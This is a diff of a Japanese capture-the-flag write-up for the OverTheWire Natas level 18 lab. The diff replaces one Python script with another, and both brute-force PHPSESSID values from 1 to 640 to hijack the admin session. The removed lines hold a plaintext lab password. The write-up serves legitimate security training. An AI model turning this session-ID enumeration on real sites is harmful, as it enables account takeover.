@@ -148,24 +148,31 @@ function createID($user) { /* {{{ */
 なので1~640を順に調べていって管理者のセッションIDを探索する。  
 
 ```
-#!/usr/bin/env python3
 import requests
 import string
-import time
 from requests.auth import HTTPBasicAuth
 
+basicAuth=HTTPBasicAuth('natas18', '*****************************')
 
-basicAuth=HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
-url='http://natas18.natas.labs.overthewire.org'
+MAX = 640
+count = 1
 
-for i in range(0, 641):
-    print("Trying number %d" % i)
-    cookie = {"PHPSESSID": str(i)}
-    resp = requests.request(method='POST', url=url, cookies=cookie, auth=basicAuth)
-    time.sleep(0.1)
-    if "You are an admin." in resp.content:
-        print(resp.content)
-        break
+u="http://natas18.natas.labs.overthewire.org/index.php?debug"
+
+while count <= MAX:
+    sessionID = "PHPSESSID=" + str(count)
+    print(sessionID)
+
+    headers = {'Cookie': sessionID}
+    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)
+
+    if "You are logged in as a regular user" not in response.text:
+        print(response.text)
+
+    count += 1
+
+print("Done!")
+
 ```
 
 実行してしばらく待つと、PHPSESSIDが`119`でflagが表示される。  
